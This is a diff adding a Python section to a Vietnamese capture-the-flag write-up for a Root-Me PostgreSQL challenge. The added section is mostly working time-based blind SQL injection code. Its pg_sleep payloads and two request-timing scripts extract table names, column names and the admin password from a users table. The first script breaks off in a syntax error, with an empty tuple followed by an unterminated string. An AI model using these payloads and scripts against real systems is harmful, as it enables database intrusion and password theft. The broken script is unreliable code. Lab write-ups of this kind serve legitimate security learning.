@@ -43,5 +43,147 @@ Ra kết quả có tables `users`. Tiếp tục vào table `users`
 Bước cuối chỉ cần lấy data các column nữa là xong
 
 
+## Script Python
 
+Vì mình đã chạy sqlmap ở trên nên database này đang chạy ở verssion PostgreSQL. Nên payload được dùng là
+
+`;select case when 1=1 then (select pg_sleep(1)) else (select pg_sleep(0)) end -- -`
+
+Mình tham khảo các hàm [ở đây](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+
+Bây giờ ta sẽ tiến hành khai thác các tên bảng, tên cột được tạo bởi user bằng cách dùng thư viện requests và thư viện time của python. Với payload có dạng như sau:
+
+```
+;select case when length((select array_to_string(array(select table_name::text from information_schema.tables where table_schema in ($$public$$)),$$:$$)::text))={tableNameLen} then (select pg_sleep(5)) else (select pg_sleep(0)) end -- --
+```
+
+Source code 
+
+```
+import requests
+import time
+
+# http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;select case when 1=1 then (select pg_sleep(2)) else (select pg_sleep(0))-- --
+
+# Find list of table_names splited by ":" which created by user
+# queryTableName = 
+
+url = "http://challenge01.root-me.org/web-serveur/ch40/index.php"
+
+# Find length of table_name list
+tableNameLen = 0
+print("Finding length of table_name list....")
+while True:
+    tableNameLen += 1
+    queryTableLen = f"1;select case when length((select array_to_string(array(select table_name::text from information_schema.tables where table_schema in ($$public$$)),$$:$$)::text))={tableNameLen} then (select pg_sleep(1)) else (select pg_sleep(0)) end -- --"
+    start = time.monotonic()
+    r = requests.get(url, params={"action": "member", "member": queryTableLen})
+    roundtrip = time.monotonic() - start
+    if roundtrip > 1:
+        break
+
+print(f"==> table_name list has {tableNameLen} characters")
+print("-------------")
+
+# Find Tables_Names list
+tableName = ""
+print("Finding table_names list......")
+for i in range(1, tableNameLen + 1):
+    for j in range(33, 127):
+        queryTableName = (
+            f"1;select case when substr((select array_to_string(array(select table_name::text from information_schema.tables where table_schema in ($$public$$)),$$:$$)::text),{i},1)=CHR({j}) then (select pg_sleep(1)) else (select pg_sleep(0)) end-- -"
+        )
+        start = time.monotonic()
+        r = requests.get(url, params={"action": "member", "member": queryTableName})
+        roundtrip = time.monotonic() - start
+        if roundtrip > 1:
+            tableName += chr(j)
+            print(f"{tableName}...")
+            break
+
+print(f"==> List of table_name is: {tableName}")
+print("--------------------------------------------------")
+
+# Find list of column_names splited by : which created by user
+# Find length
+columnNameLen = 0
+print("Finding length of column_names list......")
+while True:
+    columnNameLen += 1
+    queryColumnLen = f"1;select case when length((select array_to_string(array(select column_name::text from information_schema.columns where table_schema in ($$public$$)),$$:$$)::text))={columnNameLen} then (select pg_sleep(1)) else (select pg_sleep(0)) end -- --"
+    start = time.monotonic()
+    r = requests.get(url, params={"action": "member", "member": queryColumnLen})
+    roundtrip = time.monotonic() - start
+    if roundtrip > 1:
+        break
+
+print(f"==> Column_name list has {columnNameLen} characters")
+print("----------")
+
+# Find Column_names list
+columnName = ""
+for i in range(1, columnNameLen + 1):
+    for j in range(33, 127):
+        queryColumnName = ()
+    f"1;select case when substr((select array_to_string(array(select column_name::text from information_schema.columns where table_schema in ($$public$$)),$$:$$)::text),{i},1)=CHR({j}) then (select pg_sleep(1)) else (select pg_sleep(0)) end-- -
+       
+```
+
+Sau đó thay đổi 1 chút để tìm password
+
+```
+import requests, time
+
+url = 'http://challenge01.root-me.org/web-serveur/ch40/index.php'
+
+# Find length of admin password
+adminPassLen = 0
+print("Finding length of admin password....")
+while True:
+    adminPassLen += 1
+    queryPassLen = f"1;select case when length((select array_to_string(array(select password::text from users where id = 1),$$:$$)::text))={adminPassLen} then (select pg_sleep(5)) else (select pg_sleep(0)) end -- --"
+    start = time.time()
+    r = requests.get(url, params={'action': 'member', 'member': queryPassLen})
+    roundtrip = time.time() - start
+    if roundtrip > 2:
+        break
+
+print('==> admin password has ' + str(adminPassLen) + ' characters')
+print('-------------')
+
+# Find admin password
+adminPass = ''
+print('Finding admin password......')
+for i in range(1, adminPassLen + 1):
+    for j in range(33, 127):
+        queryadminPass = f"1;select case when substr((select array_to_string(array(select password::text from users where id = 1),$$:$$)::text),{i},1)=CHR({j}) then (select pg_sleep(5)) else (select pg_sleep(0)) end-- -"
+        start = time.time()
+        r = requests.get(url, params={'action': 'member', 'member': queryadminPass})
+        roundtrip = time.time() - start
+        print(j)
+        print(roundtrip)
+        if roundtrip > 2:
+            adminPass += chr(j)
+            print(adminPass + '...')
+            break
+
+print('==> admin password is: ' + adminPass)
+print('-----------------------------------------------')
+
+# Find list of table names created by user
+tableNames = []
+print('Finding list of table names...')
+for i in range(1, 20):
+    queryTableNames = f"1;select case when EXISTS(SELECT table_name FROM information_schema.tables WHERE table_name::text like $$user_table_{i}$$) then (select pg_sleep(5)) else (select pg_sleep(0)) end-- -"
+    start = time.time()
+    r = requests.get(url, params={'action': 'member', 'member': queryTableNames})
+    roundtrip = time.time() - start
+    if roundtrip > 2:
+        tableNames.append(f'user_table_{i}')
+        print(f'Found table: user_table_{i}')
+    else:
+        break
+
+print(f'List of table names created by user: {tableNames}')
+```
 
